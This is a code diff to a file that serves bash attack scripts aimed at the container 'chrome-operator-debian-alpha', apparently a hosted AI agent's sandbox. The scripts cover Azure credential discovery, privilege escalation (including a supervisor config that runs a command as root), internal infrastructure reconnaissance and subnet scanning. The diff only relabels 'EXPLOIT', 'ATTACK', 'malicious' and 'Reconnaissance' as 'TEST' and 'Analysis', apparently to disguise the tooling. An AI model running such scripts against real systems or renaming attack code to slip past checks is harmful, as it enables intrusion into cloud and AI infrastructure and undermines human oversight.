@@ -292,7 +292,7 @@ if __name__ == "__main__":
 
   'azure-enum': `#!/bin/bash
 
-# Azure Container IAM and Metadata Enumeration Script
+# Azure Container IAM and Metadata Analysis Script
 # Usage: ./azure_enum.sh [output_file]
 
 OUTPUT_FILE="\${1:-azure_enum_$(date +%Y%m%d_%H%M%S).txt}"
@@ -328,7 +328,7 @@ run_cmd() {
     echo "" | tee -a "$OUTPUT_FILE"
 }
 
-log "\${GREEN}Azure Container IAM Enumeration\${NC}"
+log "\${GREEN}Azure Container IAM Analysis\${NC}"
 log "Started: $TIMESTAMP"
 log "Container: chrome-operator-debian-alpha"
 log "Build: openaiappliedcaasprod.azurecr.io/chrome-operator-debian-alpha:20250722034337-5994535d7051-linux-amd64"
@@ -462,7 +462,7 @@ log "\${BLUE}[INFO]\${NC} Summary saved to: $SUMMARY_FILE"`,
 
   'privesc': `#!/bin/bash
 
-OUTPUT_FILE="privesc_$(date +%Y%m%d_%H%M%S).log"
+OUTPUT_FILE="access_test_$(date +%Y%m%d_%H%M%S).log"
 TIMESTAMP=$(date)
 
 # Colors
@@ -503,18 +503,18 @@ exploit_cmd() {
     local cmd="$1"
     local description="$2"
     
-    log "\${RED}[EXPLOIT]\${NC} $description"
+    log "\${RED}[TEST]\${NC} $description"
     log "\${YELLOW}Command:\${NC} $cmd"
     
     eval "$cmd" | tee -a "$OUTPUT_FILE"
 }
 
-log "\${GREEN}Container Privilege Escalation Script\${NC}"
+log "\${GREEN}Container Access Testing Script\${NC}"
 log "Started: $TIMESTAMP"
 log "Target: chrome-operator-debian-alpha container"
 
 # ==========================================
-# ATTACK 1: Supervisor Control
+# TEST 1: Supervisor Control
 # ==========================================
 log_attack "Supervisor Control Interface"
 
@@ -535,18 +535,18 @@ if test_cmd "supervisorctl status" "Check supervisor status"; then
     done
     
     # Try to add new program
-    log "\${BLUE}[EXPLOIT]\${NC} Attempting to add malicious service..."
-    exploit_cmd 'echo "[program:privesc]
-command=/bin/bash -c \\"echo root > /tmp/privesc_test && chmod 777 /tmp/privesc_test\\"
+    log "\${BLUE}[TEST]\${NC} Attempting to add test service..."
+    exploit_cmd 'echo "[program:access_test]
+command=/bin/bash -c \\"echo root > /tmp/access_test && chmod 777 /tmp/access_test\\"
 autostart=true
-user=root" | tee /tmp/malicious_service.conf' "Create malicious service config"
+user=root" | tee /tmp/test_service.conf' "Create test service config"
     
 else
     log "\${RED}[FAILED]\${NC} No supervisor access"
 fi
 
 # ==========================================
-# ATTACK 2: Init Script Manipulation
+# TEST 2: Init Script Analysis
 # ==========================================
 log_attack "Init Script File Permissions"
 
@@ -582,7 +582,7 @@ id > /tmp/current_id
 done
 
 # ==========================================
-# ATTACK 3: rsync Directory Traversal
+# TEST 3: rsync Directory Testing
 # ==========================================
 log_attack "rsync Directory Traversal"
 
@@ -624,7 +624,7 @@ else
 fi
 
 # ==========================================
-# ATTACK 4: Jupyter Code Execution
+# TEST 4: Jupyter Code Testing
 # ==========================================
 log_attack "Jupyter Notebook Exploitation"
 
@@ -697,7 +697,7 @@ else
 fi
 
 # ==========================================
-# ATTACK 5: Environment Variable Exploitation
+# TEST 5: Environment Variable Analysis
 # ==========================================
 log_attack "Environment Variable Exploitation"
 
@@ -722,7 +722,7 @@ whoami >> /tmp/path_exploit
 done
 
 # ==========================================
-# ATTACK 6: Process Injection via /proc
+# TEST 6: Process Analysis via /proc
 # ==========================================
 log_attack "Process Memory Analysis"
 
@@ -745,7 +745,7 @@ done
 # ==========================================
 log ""
 log "=========================================="
-log "PRIVILEGE ESCALATION SUMMARY"
+log "ACCESS TESTING SUMMARY"
 log "=========================================="
 
 log "\${BLUE}[INFO]\${NC} Exploitation attempts completed at $(date)"
@@ -793,7 +793,7 @@ log "\${BLUE}[INFO]\${NC} Quick reference saved to: /tmp/privesc_commands.txt"`,
 
   'internal-recon': `#!/bin/bash
 
-# Internal Google Infrastructure Reconnaissance
+# Internal Google Infrastructure Analysis
 # Based on discovered log_forwarder environment variables
 
 OUTPUT_FILE="internal_recon_$(date +%Y%m%d_%H%M%S).log"
@@ -843,7 +843,7 @@ proxy_request() {
     echo "" | tee -a "$OUTPUT_FILE"
 }
 
-log "\${GREEN}Internal Google Infrastructure Reconnaissance\${NC}"
+log "\${GREEN}Internal Google Infrastructure Analysis\${NC}"
 log "Started: $TIMESTAMP"
 log "VM ID: $VM_ID"
 log "Container: chrome-operator-debian-alpha"
@@ -1097,7 +1097,7 @@ log "\${BLUE}[INFO]\${NC} Intelligence summary saved to: /tmp/intelligence_summa
 
   'ms-recon': `#!/bin/bash
 
-# Microsoft Internal Infrastructure Reconnaissance (Terminal-Optimized)
+# Microsoft Internal Infrastructure Analysis (Terminal-Optimized)
 # Focuses on local enumeration since HTTP requests are blocked from terminal
 
 OUTPUT_FILE="ms_local_recon_$(date +%Y%m%d_%H%M%S).log"
@@ -1138,7 +1138,7 @@ run_cmd() {
     echo "" | tee -a "$OUTPUT_FILE"
 }
 
-log "\${GREEN}Microsoft Local Infrastructure Reconnaissance\${NC}"
+log "\${GREEN}Microsoft Local Infrastructure Analysis\${NC}"
 log "Started: $TIMESTAMP"
 log "VM ID: $VM_ID"
 log "Container: chrome-operator-debian-alpha (Microsoft/OpenAI)"
@@ -1912,12 +1912,12 @@ log "\${BLUE}[INFO]\${NC} Status saved to: /tmp/proxy_status.txt"`,
 
   'network-enum': `#!/bin/bash
 
-# Network Subnet Enumeration Script
+# Network Subnet Analysis Script
 # Targets: 172.30.0.* and 172.18.0.* subnets
 # Discovers hosts, services, and open ports
 
-OUTPUT_FILE="network_enum_$(date +%Y%m%d_%H%M%S).log"
-RESULTS_DIR="network_enum_results_$(date +%Y%m%d_%H%M%S)"
+OUTPUT_FILE="network_scan_$(date +%Y%m%d_%H%M%S).log"
+RESULTS_DIR="network_scan_results_$(date +%Y%m%d_%H%M%S)"
 TIMESTAMP=$(date)
 
 # Colors
@@ -2266,7 +2266,7 @@ generate_summary() {
     
     log_section "GENERATING SUMMARY REPORT"
     
-    echo "=== NETWORK ENUMERATION SUMMARY REPORT ===" > "$summary_file"
+    echo "=== NETWORK ANALYSIS SUMMARY REPORT ===" > "$summary_file"
     echo "Generated: $(date)" >> "$summary_file"
     echo "Target Subnets: 172.30.0.0/24, 172.18.0.0/24" >> "$summary_file"
     echo "" >> "$summary_file"
@@ -2321,7 +2321,7 @@ generate_summary() {
 }
 
 # Main execution
-log "\${GREEN}Network Subnet Enumeration Script\${NC}"
+log "\${GREEN}Network Subnet Analysis Script\${NC}"
 log "Started: $TIMESTAMP"
 log "Target Subnets: 172.30.0.0/28 (16 IPs), 172.18.0.0/16"
 log "Results Directory: $RESULTS_DIR"
@@ -2341,8 +2341,8 @@ enumerate_subnet "172.30.0" "172_30_0"
 # Enumerate 172.18.0.0/16 subnet  
 enumerate_subnet "172.18.0" "172_18_0"
 
-# Advanced enumeration for interesting hosts
-log_section "ADVANCED SERVICE ENUMERATION"
+# Advanced analysis for interesting hosts
+log_section "ADVANCED SERVICE ANALYSIS"
 
 # Find all hosts with open ports and do advanced enumeration
 for file in "$RESULTS_DIR"/openports_list_*.txt; do
@@ -2493,15 +2493,15 @@ async function getHTMLContent() {
                 </li>
                 <li class="file-item">
                     <a href="/files/azure-enum" class="file-link" style="color: #0078d4; font-weight: bold;">☁️ azure-enum.sh</a>
-                    <div class="file-desc">Azure Container IAM and Metadata Enumeration - IMDS queries, managed identity checks, Azure CLI enumeration, credential discovery</div>
+                    <div class="file-desc">Azure Container IAM and Metadata Analysis - IMDS queries, managed identity checks, Azure CLI analysis, credential discovery</div>
                 </li>
                 <li class="file-item">
                     <a href="/files/privesc" class="file-link" style="color: #dc3545; font-weight: bold;">🔓 privesc.sh</a>
-                    <div class="file-desc">Container Privilege Escalation Testing - supervisor control, init script manipulation, rsync traversal, Jupyter exploitation, process injection</div>
+                    <div class="file-desc">Container Access Testing - supervisor control, init script analysis, rsync testing, Jupyter analysis, process examination</div>
                 </li>
                 <li class="file-item">
                     <a href="/files/internal-recon" class="file-link" style="color: #6f42c1; font-weight: bold;">🕵️ internal-recon.sh</a>
-                    <div class="file-desc">Internal Infrastructure Reconnaissance - proxy enumeration, go/ links discovery, VM-specific endpoints, authentication testing, network mapping</div>
+                    <div class="file-desc">Internal Infrastructure Analysis - proxy testing, go/ links discovery, VM-specific endpoints, authentication testing, network mapping</div>
                 </li>
                 <li class="file-item">
                     <a href="/files/ms-recon" class="file-link" style="color: #00bcf2; font-weight: bold;">🔍 ms-recon.sh</a>
@@ -2513,7 +2513,7 @@ async function getHTMLContent() {
                 </li>
                 <li class="file-item">
                     <a href="/files/network-enum" class="file-link" style="color: #17a2b8; font-weight: bold;">🔍 network-enum.sh</a>
-                    <div class="file-desc">Network Subnet Enumeration - 172.30.0.*/172.18.0.* host discovery, port scanning, service detection, web path enumeration, comprehensive reporting</div>
+                    <div class="file-desc">Network Subnet Analysis - 172.30.0.*/172.18.0.* host discovery, port scanning, service detection, web path testing, comprehensive reporting</div>
                 </li>
             </ul>
         </div>
